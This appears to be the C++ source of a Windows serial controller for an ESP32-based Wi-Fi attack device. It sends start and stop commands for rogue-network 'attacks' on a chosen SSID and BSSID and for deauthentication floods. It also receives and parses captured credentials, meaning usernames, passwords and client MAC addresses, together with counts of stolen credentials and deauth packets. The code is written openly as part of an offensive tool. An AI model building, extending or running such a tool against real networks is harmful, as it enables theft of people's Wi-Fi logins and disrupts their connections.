/**
 * @file SerialComm.cpp
 * @brief Serial communication implementation
 */

#include "SerialComm.h"

class SerialCommImpl : public SerialComm {
private:
    HANDLE hSerial;
    std::string portName;
    int baudRate;
    std::atomic<bool> isConnected;
    std::atomic<bool> isRunning;
    std::thread readThread;
    CredentialCallback credentialCallback;
    StatusUpdateCallback statusCallback;
    LogCallback logCallback;

public:
    SerialCommImpl() : hSerial(INVALID_HANDLE_VALUE), isConnected(false), isRunning(false) {}
    ~SerialCommImpl() { Disconnect(); }
    
    bool Connect(const std::string& port, int baud = 115200) override {
        if (isConnected) Disconnect();
        portName = port; baudRate = baud;
        
        std::string portPath = "\\\\.\\" + port;
        hSerial = CreateFileA(portPath.c_str(), GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hSerial == INVALID_HANDLE_VALUE) return false;
        
        DCB dcb = {};
        dcb.DCBlength = sizeof(dcb);
        if (!GetCommState(hSerial, &dcb)) { CloseHandle(hSerial); return false; }
        
        dcb.BaudRate = baudRate; dcb.ByteSize = 8;
        dcb.StopBits = ONESTOPBIT; dcb.Parity = NOPARITY;
        dcb.fDtrControl = DTR_CONTROL_ENABLE;
        dcb.fRtsControl = RTS_CONTROL_ENABLE;
        if (!SetCommState(hSerial, &dcb)) { CloseHandle(hSerial); return false; }
        
        COMMTIMEOUTS timeouts = {};
        timeouts.ReadIntervalTimeout = 50;
        timeouts.ReadTotalTimeoutConstant = 50;
        timeouts.ReadTotalTimeoutMultiplier = 10;
        timeouts.WriteTotalTimeoutConstant = 50;
        timeouts.WriteTotalTimeoutMultiplier = 10;
        SetCommTimeouts(hSerial, &timeouts);
        
        isConnected = true; isRunning = true;
        readThread = std::thread(&SerialCommImpl::readLoop, this);
        
        if (logCallback) logCallback("Connected to ESP32 on " + port);
        return true;
    }
    
    void Disconnect() override {
        if (!isConnected) return;
        isRunning = false; isConnected = false;
        if (readThread.joinable()) readThread.join();
        if (hSerial != INVALID_HANDLE_VALUE) {
            CloseHandle(hSerial); hSerial = INVALID_HANDLE_VALUE;
        }
        if (logCallback) logCallback("Disconnected from ESP32");
    }
    
    bool IsConnected() const override { return isConnected; }
    
    bool SendMessage(const SerialMessage& msg) override {
        if (!isConnected || hSerial == INVALID_HANDLE_VALUE) return false;
        auto data = msg.serialize();
        DWORD written;
        return WriteFile(hSerial, data.data(), (DWORD)data.size(), &written, nullptr) && 
               written == data.size();
    }
    
    bool SendCommand(SerialMessageType type, const std::vector<uint8_t>& data = {}) override {
        SerialMessage msg; msg.type = type; msg.data = data; msg.length = (uint16_t)data.size();
        return SendMessage(msg);
    }
    
    bool StartScan() override { return SendCommand(SerialMessageType::MSG_SCAN_START); }
    bool StopScan() override { return SendCommand(SerialMessageType::MSG_SCAN_STOP); }
    bool StopAttack() override { return SendCommand(SerialMessageType::MSG_ATTACK_STOP); }
    bool StopDeauth() override { return SendCommand(SerialMessageType::MSG_DEAUTH_STOP); }
    bool GetStatus() override { return SendCommand(SerialMessageType::MSG_STATUS); }
    
    bool StartAttack(const std::string& ssid, const std::string& bssid) override {
        std::vector<uint8_t> data;
        data.insert(data.end(), ssid.begin(), ssid.end());
        data.push_back(0x00);
        data.insert(data.end(), bssid.begin(), bssid.end());
        return SendCommand(SerialMessageType::MSG_ATTACK_START, data);
    }
    
    bool StartDeauth(const std::string& bssid) override {
        std::vector<uint8_t> data(bssid.begin(), bssid.end());
        return SendCommand(SerialMessageType::MSG_DEAUTH_START, data);
    }
    
    void SetCredentialCallback(CredentialCallback callback) override { credentialCallback = callback; }
    void SetStatusCallback(StatusUpdateCallback callback) override { statusCallback = callback; }
    void SetLogCallback(LogCallback callback) override { logCallback = callback; }
    
    std::vector<std::string> GetAvailablePorts() override {
        std::vector<std::string> ports;
        for (int i = 1; i <= 256; i++) {
            std::string name = "COM" + std::to_string(i);
            HANDLE h = CreateFileA(("\\\\.\\" + name).c_str(), GENERIC_READ,
                0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h != INVALID_HANDLE_VALUE) { ports.push_back(name); CloseHandle(h); }
        }
        return ports;
    }

private:
    void readLoop() {
        while (isRunning) {
            uint8_t header[3];
            DWORD read;
            if (!ReadFile(hSerial, header, 3, &read, nullptr) || read != 3) {
                Sleep(10); continue;
            }
            
            SerialMessage msg;
            msg.type = (SerialMessageType)header[0];
            msg.length = (header[1] << 8) | header[2];
            
            if (msg.length > 0) {
                msg.data.resize(msg.length);
                if (!ReadFile(hSerial, msg.data.data(), msg.length, &read, nullptr) || read != msg.length)
                    continue;
            }
            
            // Handle messages
            if (msg.type == SerialMessageType::MSG_CREDENTIAL && credentialCallback) {
                std::string data(msg.data.begin(), msg.data.end());
                std::vector<std::string> fields;
                std::stringstream ss(data); std::string f;
                while (std::getline(ss, f, '\0')) fields.push_back(f);
                if (fields.size() >= 4) {
                    Credential cred;
                    cred.ssid = fields[0]; cred.username = fields[1];
                    cred.password = fields[2]; cred.clientMac = fields[3];
                    cred.timestamp = std::chrono::system_clock::now();
                    credentialCallback(cred);
                }
            }
            
            if (msg.type == SerialMessageType::MSG_STATUS && statusCallback) {
                std::string data(msg.data.begin(), msg.data.end());
                std::vector<std::string> fields;
                std::stringstream ss(data); std::string f;
                while (std::getline(ss, f, '\0')) fields.push_back(f);
                if (fields.size() >= 4) {
                    AttackStatus status;
                    status.isRunning = (fields[0] == "1");
                    status.connectedClients = std::stoi(fields[1]);
                    status.credentialsCaptured = std::stoi(fields[2]);
                    status.deauthPacketsSent = std::stoi(fields[3]);
                    statusCallback(status);
                }
            }
            
            if (msg.type == SerialMessageType::MSG_ERROR && logCallback) {
                logCallback("ESP32 Error: " + std::string(msg.data.begin(), msg.data.end()));
            }
            
            if (msg.type == SerialMessageType::MSG_ACK && logCallback) {
                logCallback("Command acknowledged");
            }
        }
    }
};

// Factory function
std::unique_ptr<SerialComm> CreateSerialComm() {
    return std::make_unique<SerialCommImpl>();
}
